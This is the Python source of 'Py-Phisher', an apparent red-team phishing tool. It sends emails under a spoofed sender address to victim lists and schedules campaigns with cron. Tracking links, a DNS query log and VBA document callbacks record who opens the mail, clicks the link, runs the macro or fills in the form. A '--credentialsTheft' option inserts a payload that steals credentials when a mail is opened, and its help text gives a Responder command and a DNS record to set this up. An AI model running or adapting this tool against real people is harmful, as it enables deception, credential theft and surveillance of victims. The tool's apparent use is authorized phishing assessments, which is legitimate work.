#!/usr/bin/env python
#coding: utf8
# 
# Py-Phisher - A simple script for basic phishing by https://github.com/1mm0rt41PC
#
# Filename: py-phisher.py
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; see the file COPYING. If not, write to the
# Free Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
#
import re;
import csv, json;
import os,sys;
import zipfile;
from time import time, strftime, strptime, mktime;
from glob import glob;
try:
	from base64 import encodestring as b64Wide, b64encode;# Py2
	from StringIO import StringIO;
except:
	from base64 import encodebytes as b64Wide, b64encode;# Py3
	from io import StringIO;
from inc.Conf import *;
import inc.HTTPServer as HTTPServer;
from inc.Utils import parseHostname, pretty_csv, csvRead, export2CSV, getStatsFromDB, readDB;
from inc.Mail import Mail;
from inc.Campaign import getCampaign, addCronTask, rmCronTask;


__LOGO__ = r'''
██████╗ ██╗   ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝     ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝ ╚████╔╝█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
██╔═══╝   ╚██╔╝ ╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
██║        ██║        ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚═╝        ╚═╝        ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
''';

__USAGE__ = r'''
################################################################################
Example of usage:

Mode interactive
    ./py-phisher.py

Interact with previous campaign:
    ./py-phisher.py --campaignId=XXXXX

Manual sending a campagne to ONE victim (3th1c41@1mm0r41.local) and send report to 3th1c41@1mm0r41.local usurpate evil-mailer@evildomain.fr
    ./py-phisher.py --csvUsers=3th1c41@1mm0r41.local --logToEmail=3th1c41@1mm0r41.local --from=evil-mailer@evildomain.fr "--from-name=Give me your €€"

Manual sending a campagne to a list victim and send report to 3th1c41@1mm0r41.local usurpate evil-mailer@evildomain.fr
    ./py-phisher.py --csvUsers=victim.csv --logToEmail=3th1c41@1mm0r41.local --from=evil-mailer@evildomain.fr "--from-name=Give me your €€"

Create task for sending the campagne at 2018-12-31_08:30 to ONE victime (3th1c41@1mm0r41.local) and send report to 3th1c41@1mm0r41.local usurpate evil-mailer@evildomain.fr
    ./py-phisher.py --csvUsers=3th1c41@1mm0r41.local --logToEmail=3th1c41@1mm0r41.local --from=evil-mailer@evildomain.fr "--from-name=Give me your €€" --sendAt=2018-12-31_08:30

--csvUsers=<email>,<email>,... or <file.csv>
    # Desc: Victim or Victim list
    #
    # Format for <file.csv>
    # email; lastname; firstname; group1; group2; group3

--logToEmail=<email>
    # Desc: Send report to <email> at every 17h00 every day

--from=<email>
    # Desc: Phisher email
    # Default: evil-mailer@evildomain.fr
    
--from-name=<string>
    # Desc: Phisher Name
    # Default: None
    # Ex: for adding spaces use quot "--from-name=1mm0r41"

--eml=<file> or <None>
    # Desc: Email template to use. If omited, interactiv session with an IMAP server to select a template in the "Sent" folder.
    
--getStats
    # Desc: Get stats for a campaign. Require --campaignId
    
--campaignId=<id>
    # Desc: Use this arg if you what to interact with a Campaign.
    # Note: Campaign ID generated by Py-Phisher
    
--sendAt=<Date> or <None>
    # Desc: Make a crontab for sending the phishing session. If omited, direct sending the phishing session.
    # Format: %Y-%m-%d_%H:%M

--www=<Folder> or <None>
    # Desc: The http folder for links
    
--client=<client name> or <None>
    # Desc: The name client. Will be used in the report.
    
--getLastTemplate
    # Desc: Get the last template from office and use it
    
--removeAllCron
    # Desc: Remove all old py-phisher CRON
    
--credentialsTheft
    # Desc: Insert malicious payload to theft user's credentials on mail open.
            Run responder on a dedicated server with the following command:
            root@kali:# responder -I eth0 --lm -v -b
            And do not forget to add in the DNS config:
            *.responder.<domain>.fr.         IN      A	<ip-responder>
--debugEml
    # Desc: If enabled, will save all mail to /tmp/<email>.<campaignId>


################################################################################
EML
The following fields can be used in the email and in filename:
    ${DOMAIN}          - Main Domain for DNS tunnel
    ${FROM_MAIL}       - Email FROM
    ${FROM_NAME}       - Email FROM NAME
    ${DEST_MAIL}       - Email destination
    ${DEST_NAME}       - Name of the destination
    ${CAMPAIGN_ID}     - ID of the campaign
    ${USER_ID}         - User ID
    ${TRACKER_LINK}    - HTTP link to the form ex: http://poney.com/piolosputkpuoipyputlyr == http://poney.com/${TRACKER_ID}
    ${TRACKER_ID}      - User tracker for campaign.
    ${TRACKER_IMG}     - HTML Picture to detect if the email has been opened

    ${STATS_OPEN}...${/STATS_OPEN}     - If the user has allready OPENED the email, the html between these tags in the email will be showed. If the user hasn't opened the email, this tag will be removed.
    ${!STATS_OPEN}...${/!STATS_OPEN}     - If the user hasn't OPENED the email, the html between these tags in the email will be showed. If the user hasn opened the email, this tag will be removed.
    ${STATS_OPEN__DATA}                - If the user has allready OPENED the email, this tag will be replaced by the date when the mail has been opened.

    ${STATS_VBA}...${/STATS_VBA}       - If the user has allready OPENED the email and executed the DOCM, the html between these tags in the email will be showed. If the user hasn't executed the DOCM, this tag will be removed.
    ${!STATS_VBA}...${/!STATS_VBA}       - If the user has OPENED the email and NOT executed the DOCM, the html between these tags in the email will be showed. If the user has executed the DOCM, this tag will be removed.
    ${STATS_VBA__DATA}                 - If the user has allready OPENED the email and executed the DOCM, this tag will be replaced by the date when the DOCM has been opened.

    ${STATS_LINK}...${/STATS_LINK}     - If the user has allready OPENED the email and clicked on the HTTP link, the html between these tags in the email will be showed. If the user hasn't clicked on the HTTP link, this tag will be removed.
    ${!STATS_LINK}...${/!STATS_LINK}     - If the user has OPENED the email and NOT clicked on the HTTP link, the html between these tags in the email will be showed. If the user has clicked on the HTTP link, this tag will be removed.
    ${STATS_VBA__LINK}                 - If the user has allready OPENED the email and clicked on the HTTP link, this tag will be replaced by the date when the HTTP link has been clicked.

    ${STATS_FORM}...${/STATS_FORM}     - If the user has allready OPENED the email and the form of the website filled, the html between these tags in the email will be showed. If the user hasn't filled the form, this tag will be removed.
    ${!STATS_FORM}...${/!STATS_FORM}     - If the user has OPENED the email and the form of the website NOT filled, the html between these tags in the email will be showed. If the user has filled the form, this tag will be removed.
    ${STATS_FORM__DATA}                - If the user has allready OPENED the email and the form of the website filled, this tag will be replaced by the DATA of the FORM.

    ${STATS_VICTIM_SAFE}...GG you havn't been powned ...${STATS_VICTIM_SAFE} - If the user hasn't opened the malicious email this content will be shown.
    ${!STATS_VICTIM_SAFE}...FAIL you have been powned ...${!STATS_VICTIM_SAFE} - If the user HAS opened the malicious email this content will be shown.
''';
__USAGE__ = re.sub(r'--([^\r\n=]+)', '\033[32m--\\1\033[0m', __USAGE__);


def main( args ):
	global __LOGO__, __USAGE__, parsedArg;
	print(__LOGO__);
	sys.stdout.flush();
	
	parsedArg = {
		'csvUsers': None,
		'campaignId': None,
		'logToEmail': None,
		'from': None,
		'from-name': None,
		'eml': None,
			# Desc: Email template to use. If not specified => get the template from an IMAP server in interactive mode
			# val: <File> or <String> or <None>
		
		'getStats': False,
		'isCron': False,
			# Desc: CRON mode? INTERNAL USE in the program
			# val: <Bool>
		
		'sendAt': None,
		'client': 'Confidential',
		'www': '',
		'getLastTemplate': False,
		
		'removeAllCron': False,
		'credentialsTheft': False,
		'debugEml': False,		
	};
	
	if '--campaignId=' in  ' '.join(args):# We load an existing campaign
		try:
			campaignId = (' '.join(args)).split('--campaignId=')[1].split(' ')[0];
			tmp = loadCampaign(campaignId);
			parsedArg = tmp;
		except:
			pass;
	
	for ar in args[1:]:
		found = 0;
		for key in parsedArg:
			cmd = '--'+key;
			if type(parsedArg[key]) != type(False):
				cmd += '=';
			if ar.startswith(cmd) or ar.lower().startswith(cmd.lower()):
				if '=' in cmd:
					parsedArg[key] = ar[len(cmd):];
				else:
					parsedArg[key] = True;
				found = 1;
		if not found:
			log.warning('Invalid argument: %s', ar);
			print(__USAGE__);
			return 1;
	log.info('Run with argument:'+json.dumps(parsedArg, indent=4));
	
	# Removing old CRON tasks
	if parsedArg['removeAllCron']:
		parsedArg['removeAllCron'] = False;
		log.info('Removing all previous py-phisher CRON.');
		for mfile in glob('/etc/cron.hourly/py-phisher_*.sh'):
			log.info('Removing '+mfile);
			os.remove(mfile);
	
	############################################################################
	if len(args) <= 1:
		def getValue( check=None, default=None ):
			while 1:
				sys.stdout.write(':\> ');
				sys.stdout.flush();
				data = sys.stdin.readline().strip('\r\n\t ');
				if not data and default != None:
					print('');
					return default;
				try:
					if data and ((check != None and check(data)) or check == None):
						print('');
						return data;
				except Exception as e:
					print('Err: '+str(e));
				print('Invalid value or format');

		print('Email of the victim or CSV file');
		print('    Format for <file.csv>');
		print('    email; lastname; firstname; group1; group2; group3');
		print('    OR');
		print('    email; lastname; firstname; group1; group2; group3; open; vba; link; form; other');
		parsedArg['csvUsers'] = getValue(lambda x: ('@' in x or os.path.exists(x)));
				
		print('Send the phishing at which date ?');
		print('Expected value:\n    (empty) => Now\n    Or valid date like 2018-12-31_17:30');
		parsedArg['sendAt'] = getValue(lambda x: x == '' or strptime(x, '%Y-%m-%d_%H:%M'), '');
		
		print('Send reports to ?\nex:\n    report@hacker.fr');
		parsedArg['logToEmail'] = getValue(lambda x: ('@'));
		
		print('Send phishing FROM which malicious email ?\nex:\n    evil@mailer.com');
		parsedArg['from'] = getValue(lambda x: ('@'));
		
		print('Send phishing FROM-NAME which malicious email ?\nex:\n    1mm0r41');
		parsedArg['from-name'] = getValue(lambda x: True);
		
		print('Name of the Client (For the report):');
		parsedArg['client'] = getValue(lambda x: True);
		
	
	sendAt = None;
	if parsedArg['sendAt']:
		# We have to send the campaign on time
		try:
			sendAt = strptime(parsedArg['sendAt'], '%Y-%m-%d_%H:%M');
		except Exception as e:
			log.critical('Invalid date format: %Y-%m-%d_%H:%M. ex: 2018-12-31_17:30');
			return 1;
		sendAt = mktime(sendAt);
	
	
	if parsedArg['isCron']:
		log.info('Mode CRON');
		if parsedArg['sendAt']:
			if sendAt <= time():
				log.info('CRON sending email');
				# On doit envoyer la campagne à l'heure
				ml = getCampaign(parsedArg);
				# Suppression de la tache cron
				rmCronTask(parsedArg, 'sendAt');				
				sendPhishing(ml, parsedArg);
				return 0;
			log.info('This is not the time for sending the campaign...');
			return 0;
		if strftime('%H') == '17':
			log.info('CRON sending STATS email');
			getStats( parsedArg, printData=False );
			return 0;
		log.info('This is not 17h00, no report action.');
		return 0;
		
	if parsedArg['getStats'] and parsedArg['campaignId']:
		getStats( parsedArg, printData=True );
		return 0;
		
	# We check the pre-requisites:
	try:
		if not parsedArg['csvUsers'] or ('@' not in parsedArg['csvUsers'] and not os.path.exists(parsedArg['csvUsers'])):
			raise Exception('Invalid csvUsers argument. usage --csvUsers=<file> or --csvUsers=test@victim.fr,test2@victim.fr');
			
		if parsedArg['sendAt'] and (not parsedArg['logToEmail'] or '@' not in parsedArg['logToEmail']):
			raise Exception('Invalid logToEmail argument. usage --logToEmail=report@hacker.fr');
			
		if not parsedArg['from'] or '@' not in parsedArg['from']:
			raise Exception('Invalid from argument. usage --from=evil@mailer.com');
			
		if not parsedArg['from-name']:
			raise Exception('Invalid from argument. usage "--from-name=1mm0r41"');
			
		if not parsedArg['client'] or not re.findall('^[A-Za-z0-9 \-\.]*$',parsedArg['client']):
			raise Exception('Invalid from argument. usage "--client=Google"');
	except Exception as e:
		if 'campaignId' in parsedArg and parsedArg['campaignId'] and  os.path.exists(G_Work+'/'+parsedArg['campaignId']+'/conf.json'):
			log.info('Previous campaign found, using previous arguements...');
			load = json.loads(open(G_Work+'/'+parsedArg['campaignId']+'/conf.json', 'rb').read());
			for k in load:
				if parsedArg[k] == None:
					parsedArg[k] = load[k];
			log.info('Working with argument:'+json.dumps(parsedArg,indent=4));
		else:
			log.critical(str(e));
			print(__USAGE__);
			return 1;
		
	# We're planning to send it
	if parsedArg['sendAt']:
		getCampaign(parsedArg);		
		if addCronTask(parsedArg, 'sendAt'):
			log.info('Mail planified');
		return 0;
	
	# Manual sending of the campaign
	ml = getCampaign(parsedArg);
	sendPhishing(ml, parsedArg);
	return 0;


def getStats( parsedArg, printData=False ):
	log.info('Reading statistics...');
	try:
		parseExtractDNSLog();
		csvFile = export2CSV(parsedArg);
		csvFile = open(csvFile, 'rb').read();

		zip = StringIO();
		with zipfile.ZipFile(zip, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
			zf.writestr(strftime('%Y-%m-%d')+'_PhishingStats_'+parsedArg['client']+'.html', getStatsFromDB(parsedArg));
			zf.writestr(strftime('%Y-%m-%d')+'_PhishingStats_'+parsedArg['client']+'.csv', csvFile);
		zip.seek(0);		
		ml = Mail('NONE', open(os.path.dirname(os.path.realpath(__file__))+'/template/template_stats.eml','r').read()).setFrom('Py-Phisher', parsedArg['from']);			
		ml._eml = (ml._eml
			.replace('${CHARSET}', 'iso-8859-1')
			.replace('${SUBJECT_B64}', b64encode('Statistics for the campaign "'+parsedArg['campaignId']+'"'))
			.replace('${FILE}', b64Wide(zip.getvalue()))
			.replace('${FILENAME}', strftime('%Y-%m-%d')+'_PhishingStats_'+parsedArg['client']+'.zip')
			.replace('${BODY_HTML}', 'Hello,<br /><br />Here are the statistics of the day<br /><br />Sincerely<br />Py-Phisher')
		);
		ml.setDest('', parsedArg['logToEmail']).send();
		if printData:
			print json.dumps(getStatsFromDB(parsedArg, True));
	except Exception as e:
		log.error(str(e), exc_info=e);
	return 0;

	

def sendPhishing(ml, parsedArg):
	global G_HTTP;
	ml.setFrom(parsedArg['from-name'],parsedArg['from']).rmHeader('Message-ID');
	
	HTTPServer.setsid(parsedArg['from'].split('@')[1]);
	
	for row in readDB(parsedArg):
		ml.setUser(row);
		ml.setDest(row['lastname'].upper()+' '+row['firstname'].title(), row['email']).send();
	log.info('All mail have been sent');
	
	if parsedArg['logToEmail'] and (('sendAt' in parsedArg and 'isCron' in parsedArg) or 'sendAt' not in parsedArg):
		log.info('Planifing mail for stats...');
		parsedArg['sendAt'] = None;
		if addCronTask(parsedArg, 'stats'):
			log.info('Stats Mail planified');
	log.info('campaignId=%s', parsedArg['campaignId']);

		
	
def parseExtractDNSLog():
	for row in open('/var/log/named/query.log','rb').read().split('\n'):
		# 12-Apr-2018 16:49:53.303 client 195.36.155.45#56281 (vba.hex.hex.evildomain.fr): query: vba.hex.hex.evildomain.fr IN A -EDC (10.0.0.214)	
		if not row:
			continue;
		row = row.split(' ');
		date = row[0]+' '+row[1];
		data = strftime('%Y-%m-%d %H:%M:%S', strptime(date.split('.')[0],'%d-%b-%Y %H:%M:%S'));		
		host = row[4].strip('().');
		parseHostname(host, date);
	
	httplog = '';
	try:
		httplog = open(G_HTTP_LOG,'rb').read().split('\n');
	except Exception as e:
		log.error(str(e));
		return False;
		
	for row in httplog:
		if not row:
			continue;
		# [2018-04-21 00:28:59,036][INFO][HTTPServer.py:196] REQ - open.piolosputkpuoipyputuopolpioioju_oloipytloopt.xxxx.fr - 90.90.24.85     - - "GET /unit-test/gnuel%40xxxxxx.fr HTTP/1.1" 404 -
		try:
			host = row.split('] REQ - ')[1].split(' ')[0];
			date = ''.join(list(row)[1:20]);
			parseHostname(host, date);
		except:
			pass;

if __name__ == '__main__':
	sys.exit(main(sys.argv));